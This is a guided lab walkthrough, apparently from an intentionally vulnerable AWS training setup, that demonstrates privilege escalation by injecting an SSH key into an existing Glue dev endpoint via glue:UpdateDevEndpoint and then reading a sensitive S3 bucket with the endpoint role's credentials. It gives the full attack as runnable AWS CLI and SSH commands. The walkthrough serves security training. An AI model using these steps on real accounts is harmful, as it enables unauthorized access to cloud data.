# Guided Walkthrough: Privilege Escalation via glue:UpdateDevEndpoint

This scenario demonstrates a privilege escalation vulnerability where a user has permission to update an existing AWS Glue Development Endpoint. Unlike the `glue:CreateDevEndpoint` scenario, the attacker doesn't need `iam:PassRole` permissions since the role is already attached to the pre-existing endpoint.

The attack leverages `glue:UpdateDevEndpoint` to add the attacker's SSH public key to an existing development endpoint that has a privileged IAM role attached. Once the SSH key is added, the attacker can SSH into the endpoint and use the attached role's credentials to access sensitive S3 buckets. This is particularly dangerous because Glue dev endpoints often have broad S3 permissions to support ETL development workflows.

AWS Glue Development Endpoints are Apache Spark environments used for developing, testing, and debugging ETL (Extract, Transform, Load) scripts. They persist until explicitly deleted, providing attackers with a stable environment for credential access and lateral movement.

## The Challenge

You start as `pl-prod-glue-002-to-bucket-starting-user`, an IAM user with a single meaningful permission: `glue:UpdateDevEndpoint`. Your goal is to read objects from the `pl-sensitive-data-glue-002-{account_id}-{suffix}` S3 bucket — which your starting identity cannot access directly.

Somewhere in the account, an existing Glue development endpoint (`pl-prod-glue-002-to-bucket-endpoint`) is running with `pl-prod-glue-002-to-bucket-target-role` attached. That role has S3 read access to the sensitive bucket. You don't need to create anything new or pass a role — the endpoint and role are already wired together. You just need to get yourself a way in.

## Reconnaissance

First, let's confirm who we are and verify we can't access the bucket directly.

```bash
aws sts get-caller-identity
# Should show: arn:aws:iam::{account_id}:user/pl-prod-glue-002-to-bucket-starting-user

aws s3 ls s3://pl-sensitive-data-glue-002-{account_id}-{suffix}
# Should fail with AccessDenied
```

Now enumerate the Glue dev endpoints in the account. The `glue:GetDevEndpoints` permission reveals what's available and — critically — which IAM role is attached to each endpoint.

```bash
aws glue get-dev-endpoints --query 'DevEndpoints[*].{Name:EndpointName,Role:RoleArn,Status:Status,Keys:NumberOfWorkers}'
```

You should see `pl-prod-glue-002-to-bucket-endpoint` with `pl-prod-glue-002-to-bucket-target-role` attached and a status of `READY`. Get the full details including the public address:

```bash
aws glue get-dev-endpoint --endpoint-name pl-prod-glue-002-to-bucket-endpoint
```

Note the `PublicAddress` field — that's where you'll SSH once your key is installed.

## Exploitation

### Step 1: Generate an SSH key pair

You need an attacker-controlled key pair. Generate one locally:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/glue-attack-key -N ""
```

This creates `/tmp/glue-attack-key` (private) and `/tmp/glue-attack-key.pub` (public). The public key is what you'll inject into the endpoint.

### Step 2: Add your public key to the endpoint

This is the one privileged action. `glue:UpdateDevEndpoint` lets you append SSH public keys to an existing endpoint. No role passing required — the role is already there.

```bash
aws glue update-dev-endpoint \
  --endpoint-name pl-prod-glue-002-to-bucket-endpoint \
  --add-public-keys "$(cat /tmp/glue-attack-key.pub)"
```

The API call succeeds immediately, but the endpoint takes 2-5 minutes to apply the change and accept connections with the new key.

### Step 3: Wait and poll for readiness

Check the endpoint status periodically:

```bash
aws glue get-dev-endpoint \
  --endpoint-name pl-prod-glue-002-to-bucket-endpoint \
  --query 'DevEndpoint.Status'
```

Wait until it returns `READY` again after the update. Retrieve the public address:

```bash
ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
  --endpoint-name pl-prod-glue-002-to-bucket-endpoint \
  --query 'DevEndpoint.PublicAddress' \
  --output text)
```

### Step 4: SSH into the endpoint

Glue dev endpoints accept SSH connections on the `glue` user:

```bash
ssh -i /tmp/glue-attack-key \
  -o StrictHostKeyChecking=no \
  glue@$ENDPOINT_ADDRESS \
  "aws s3 cp s3://pl-sensitive-data-glue-002-{account_id}-{suffix}/sensitive-data.txt -"
```

The AWS CLI on the endpoint automatically uses the attached role credentials from the instance metadata service (IMDS). You're now running commands as `pl-prod-glue-002-to-bucket-target-role`, which has access to the sensitive bucket.

## Verification

Confirm full bucket access:

```bash
ssh -i /tmp/glue-attack-key -o StrictHostKeyChecking=no glue@$ENDPOINT_ADDRESS \
  "aws s3 ls s3://pl-sensitive-data-glue-002-{account_id}-{suffix}/"
```

You should see the contents of the bucket listed. The sensitive data is now readable.

## What Happened

You exploited the fact that `glue:UpdateDevEndpoint` allows any authorized caller to inject SSH credentials into a running endpoint — without needing to create anything new or pass a role. The endpoint already had a privileged role attached as part of its normal ETL configuration. By adding your SSH key, you essentially promoted yourself to that role through a side door.

In real environments this pattern is common: data engineering teams create Glue dev endpoints with broad S3 access to enable flexible ETL development, and those endpoints sit running indefinitely (at significant cost) with no SSH key restrictions. Any principal that can call `UpdateDevEndpoint` — perhaps a developer account, a compromised CI/CD pipeline, or a misconfigured service role — can repeat this attack.
